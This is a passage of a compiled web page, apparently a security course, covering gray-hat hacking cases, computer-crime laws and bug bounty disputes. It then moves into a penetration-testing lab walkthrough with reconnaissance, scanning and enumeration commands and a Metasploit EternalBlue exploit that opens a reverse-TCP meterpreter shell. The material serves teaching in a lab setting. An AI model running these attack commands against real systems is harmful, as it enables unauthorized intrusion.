            children: "Escalate to CISA/other authorities"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "33-famous-gray-hat-cases",
      children: "3.3 Famous Gray Hat Cases"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Case: Khalil Shreateh (Facebook Bug Bounty)"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Year: 2013\nFinding: Ability to post to any Facebook user's wall without permission\nInitial Attempt: Reported via Facebook's bug bounty system\nResult: Facebook claimed it was not reproducible\nSecond Attempt: Posted to Mark Zuckerberg's wall to prove severity\nResult:\n├── Facebook fixed the bug\n├── Khalil's account was disabled\n├── Facebook refused bounty ($500 offered later, he rejected)\n├── Crowd-funded compensation: Over $10,000 from supporters\n└── HackerOne hired Khalil as a security engineer\nEthical Question: Was posting to Zuckerberg's wall justified?\n├── Yes: Only way to prove severity after FB dismissed report\n└── No: Exploiting vulnerability on a real user without consent\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Case: Geohot (George Hotz)"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Achievements:\n├── First iPhone unlock (2007) — carrier lock bypass\n├── PS3 jailbreak (2010) — gained root access, published exploit\n├── Legal battle with Sony (2011)\n│   ├── Sony sued under CFAA and DMCA\n│   ├── Settlement: Geohot banned from Sony products\n│   └── Community raised over $60K for legal defense\n└── Later: Contributed to self-driving car research (comma.ai)\n\nSignificance: The PS3 case established important precedent\nabout the legal boundaries of security research.\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Case: #OpIsrael (Anonymous)"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Year: 2013\nAction: Anonymous launched DDoS attacks against Israeli government sites\nClaim: Protesting Palestinian human rights issues\nResult:\n├── Thousands of Israeli sites targeted\n├── Multiple Anonymous participants arrested globally\n└── Continues as annual event (OpIsrael every April 7)\nGray Hat Nature:\n├── Political motivation (hacktivism) — typical of Gray Hats\n└── Unauthorized access + DDoS — criminal activity\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Case: Weev (Andrew Auernheimer) — AT&T iPad Leak"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Year: 2010\nFinding: AT&T exposed email addresses of 114,000 iPad owners (including\ngovernment officials, military, executives) via an unauthenticated API\nAction: Weev and Daniel Spitler created a script to collect the emails\n         and forwarded to Gawker for reporting\nResult:\n├── Charged under CFAA (Computer Fraud and Access to Stored Communications)\n├── Convicted: 41 months in federal prison\n├── 2014: Conviction overturned (venue issue, not technical)\n├── Later defended by EFF's Nate Cardozo\n└── Debate continues about CFAA interpretation\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Case: Goatse Security (Hacker Group)"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Similar to Weev; Goatse Security focused on finding security holes\nin major services and publishing findings. Their \"disclose everything\"\nphilosophy placed them firmly in controversial Gray Hat territory.\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "34-legal-gray-areas",
      children: "3.4 Legal Gray Areas"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Computer Fraud and Abuse Act (CFAA - US):"
      }), "\nThe CFAA (18 U.S.C. § 1030) is the primary US computer crime law. Key issues for Gray Hats:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Key CFAA Provisions:\n§ 1030(a)(2): Unauthorized access to obtain information\n§ 1030(a)(5): Causing damage through unauthorized access\n§ 1030(a)(7): Extortion involving computers\n\nGray Hat Concerns:\n├── \"Exceeds authorized access\" — vague wording\n├── Does scanning without authorization count?\n├── Does viewing publicly accessible data count?\n├── 2013: Aaron Swartz prosecuted under CFAA for downloading JSTOR articles\n│   → Faced 35 years, committed suicide before trial\n├── 2021 (Van Buren v. United States): Supreme Court narrowed CFAA\n│   → \"Exceeds authorized access\" doesn't apply if you misuse\n│     information you're allowed to access\n│   → Major win for security researchers\n└── 2022: CFAA reform bill introduced but not passed\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "UK Computer Misuse Act 1990:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Section 1: Unauthorized access to computer material\n  - Up to 2 years imprisonment\nSection 2: Unauthorized access with intent to commit further offenses\n  - Up to 5 years imprisonment\nSection 3: Unauthorized acts with intent to impair computer operation\n  - Up to 10 years imprisonment\n\nGray Hat Concern: Any unauthorized scanning or testing violates\nSection 1, regardless of intention. There is no \"public interest\"\ndefense for vulnerability research.\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Other International Laws:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Country"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Law"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Key Concern for Researchers"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "China"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cybersecurity Law, Data Security Law"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "VPN testing, data access"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Russia"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Federal Law No. 149-FZ (Information Law)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Encryption research, VPN"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "EU"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GDPR (Art. 32, 33)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Breach disclosure obligations"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Germany"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "§ 202a StGB (Data Espionage)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No research exemption"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Japan"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unauthorized Computer Access Law"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires authorization"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "India"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IT Act 2000 § 43, 66"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Broad, vague language"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Canada"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Criminal Code § 342.1 (Unauthorized use of computer)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Similar to CFAA"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "35-bug-bounty-disputes",
      children: "3.5 Bug Bounty Disputes"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Common Dispute Types:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Dispute Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Scope Creep"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vendor claims finding is out of scope"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Finding in *.vendor.com subdomain that vendor \"doesn't own\""
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Severity Downgrade"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vendor rates lower than researcher"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SQLi rated as Medium instead of Critical"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Duplicate"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vendor claims already reported"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Researcher proves dupe is actually different"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "p-Hacking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vendor splits issue into many \"low\" findings"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CSRF tokens missing treated as separate issues"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Disclosure Violation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Researcher publishes before patch"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Researcher releases details at 90 days, vendor wanted 180"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Payout Dispute"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disagreement on bounty amount"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Critical finding, vendor offers $500"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Banning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Researcher banned for \"invalid reports\""
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pattern: researcher banned after finding critical bugs"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Tools for Dispute Resolution:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "HackerOne Mediation:"
        }), " Platform acts as intermediary"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Bugcrowd Arbitration:"
        }), " Third-party managed mediation"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "CISO Intermediary:"
        }), " Company infosec team can override bug bounty team"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Researcher Community:"
        }), " Public shaming / crowd-sourced support"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Legal Action:"
        }), " Rare, but researchers have sued for payment"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-4-penetration-testing-lab---full-walkthrough",
      children: "Section 4: Penetration Testing Lab - Full Walkthrough"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "41-lab-setup",
      children: "4.1 Lab Setup"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Hardware Requirements:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Minimum: 16GB RAM, 256GB SSD, 4+ CPU cores\nRecommended: 32GB RAM, 512GB SSD, 8+ CPU cores\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Virtualization Setup (VirtualBox):"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "VM"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "OS"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "RAM"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Storage"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Network"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Purpose"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Kali Linux"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kali 2024.3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "4GB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "80GB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NAT + Host-Only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attack machine"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Metasploitable 2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Ubuntu 8.04"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "512MB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8GB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Host-Only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerable target"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Metasploitable 3 (Win)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Windows Server 2008"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2GB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "40GB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Host-Only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Windows target"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Ubuntu Server 22.04"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Ubuntu Server"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1GB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "20GB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Host-Only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Linux target"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "pfSense"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FreeBSD"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1GB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "10GB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "3 networks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Firewall/router"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Windows 10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Win 10 Pro"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "4GB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "60GB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Host-Only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Client target"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Kali Linux Tools (pre-installed):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Network Scanning: nmap, masscan, netcat, arp-scan\nWeb Tools: burpsuite, zaproxy, sqlmap, dirb, gobuster, ffuf, wfuzz, nikto\nExploitation: metasploit-framework, searchsploit, msfvenom\nPassword Attacks: hydra, john, hashcat, crunch, medusa\nPost-Exploitation: mimikatz, powershell-empire, bloodhound\nSniffing/Spoofing: wireshark, bettercap, ettercap, tcpdump\nWireless: aircrack-ng, kismet, reaver, fern-wifi-cracker\nReverse Engineering: radare2, ghidra, edb-debugger, apktool\nReporting: faraday, dradis, keepnote, cherrytree\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "42-phase-1-reconnaissance",
      children: "4.2 Phase 1: Reconnaissance"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Recon is the most critical phase. The difference between a successful pentest and a failed one is usually the quality of recon."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Passive Reconnaissance (OSINT):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Shodan.io:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "shodan search \"apache 2.4.49 country:US\"\nshodan search \"port:3389 os:Windows\"\nshodan search \"org:AcmeCorp\"\nshodan search \"ssl:acme.com\"\nshodan host 8.8.8.8\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Google Dorking:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "site:acme.com filetype:pdf confidential\nsite:acme.com filetype:log password\nsite:acme.com filetype:xlsx salary\nintitle:\"index of\" \"backup\" site:acme.com\nintitle:\"index of\" \"config\" site:acme.com\nsite:acme.com inurl:admin.php\nsite:acme.com inurl:login\nintitle:\"Dashboard [Jenkins]\" site:acme.com\nintitle:\"Kibana\" \"Please login\" site:acme.com\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "theHarvester:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "theHarvester -d acme.com -b google\ntheHarvester -d acme.com -b linkedin\ntheHarvester -d acme.com -b shodan\ntheHarvester -d acme.com -b all -l 500\n\n# Output:\n# admin@acme.com, j.doe@acme.com, support@acme.com\n# mail.acme.com, vpn.acme.com, dev.acme.com\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Amass:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "amass enum -passive -d acme.com\namass enum -active -d acme.com -brute\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Sublist3r:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "sublist3r -d acme.com -o subdomains_acme.txt\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "DNS Enumeration:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "dnsrecon -d acme.com -t axfr\ndnsrecon -d acme.com -t brt -D /usr/share/wordlists/dns.txt\ndig acme.com ANY @8.8.8.8\ndig acme.com MX @8.8.8.8\ndig acme.com TXT @8.8.8.8\nnslookup -type=MX acme.com\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Certificate Transparency:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "curl -s \"https://crt.sh/?q=%.acme.com&output=json\" | sort -u\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "43-phase-2-scanning",
      children: "4.3 Phase 2: Scanning"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Nmap - Full Port Scan:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "nmap -p- -T4 10.10.10.10 -oN full_tcp_scan.txt\n# 22/tcp open ssh, 80/tcp open http, 443/tcp open https\n# 135/tcp open msrpc, 139/tcp open netbios-ssn, 445/tcp open microsoft-ds\n# 3306/tcp open mysql, 3389/tcp open ms-wbt-server\n\nnmap -sV -sC -O -A -T4 -p 22,80,443,445,3306,3389 10.10.10.10\n# 22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.4\n# 80/tcp   open  http          Apache httpd 2.4.54\n# 445/tcp  open  microsoft-ds  Samba smbd 4.6.X\n# 3306/tcp open  mysql         MySQL 8.0.32\n\nnmap --script vuln -p 80,443,3306 10.10.10.10\n# http-shellshock: VULNERABLE\n# mysql-empty-password: Account with empty password: root\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Masscan:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "masscan 10.10.0.0/24 -p0-100 --rate=5000\nmasscan 10.0.0.0/8 -p22,3389,8080 --rate=50000 --exclude 10.0.0.1\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Nikto:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "nikto -h http://10.10.10.10\n# /.git/config: Backup file found, /console: Tomcat console\n# /phpinfo.php: PHP info, /wp-admin/: WordPress admin\n# /cgi-bin/test.cgi: Potential Shellshock\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Nuclei:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "nuclei -u https://acme.com\n# [cve-2024-XXXX] [critical] SQLi\n# [cve-2023-YYYY] [high] WordPress\n# [tech-detect] Apache 2.4.54, PHP 8.1.12\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Vulnerability Scanning (OpenVAS):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "gvm-setup && gvm-start\ngvm-cli --gmp-username admin --gmp-password pass --xml \"<create_target>...\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "44-phase-3-enumeration",
      children: "4.4 Phase 3: Enumeration"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "SMB Enumeration:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "smbclient -L //10.10.10.10 -N\n# Shares: print$, docs, IPC$\nenum4linux -a 10.10.10.10\n# Users: administrator, bob, alice, root\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Web Directory Busting:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt\n# /admin (403), /api (200), /backup (200), /login (200), /uploads (200)\n\nffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt\nffuf -w subdomains-top1million-5000.txt -u http://10.10.10.10 -H \"Host: FUZZ.acme.com\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "FTP Enumeration:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "ftp 10.10.10.10 (anonymous/anonymous)\nnmap --script ftp-anon,ftp-bounce -p 21 10.10.10.10\n# Anonymous FTP login allowed with README.txt, backup.zip\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "SMTP Enumeration:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "nmap --script smtp-commands,smtp-enum-users -p 25 10.10.10.10\nsmtp-user-enum -M VRFY -U users.txt -t 10.10.10.10\n# VRFY says: admin exists, root exists\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "SNMP Enumeration:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "snmpwalk -c public -v2c 10.10.10.10\nonesixtyone -c snmp-community.txt 10.10.10.10\n# [public] Linux AcmeServer 5.15.0-86-generic\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "LDAP Enumeration:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "nmap --script ldap-rootdse,ldap-search -p 389 10.10.10.10\nldapsearch -x -h 10.10.10.10 -b \"dc=acme,dc=com\" \"(objectclass=user)\" sAMAccountName\n# jdoe: Domain Admins\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "NFS Enumeration:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "showmount -e 10.10.10.10\n# /home *, /var/backups 10.0.0.0/24, /opt/shared (everyone)\nmount -t nfs 10.10.10.10:/home /mnt/nfs_home\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "45-phase-4-exploitation",
      children: "4.5 Phase 4: Exploitation"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Metasploit Framework - Full Walkthrough:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "msfconsole -q\nmsf6 > search eternalblue\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > set RHOSTS 10.10.10.10\nmsf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6 > set LHOST 10.10.10.5\nmsf6 > set LPORT 4444\nmsf6 > exploit\n\n# [*] Host is likely VULNERABLE to MS17-010!\n# [*] Meterpreter session 1 opened\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "msfvenom Payload Generation:"
      })
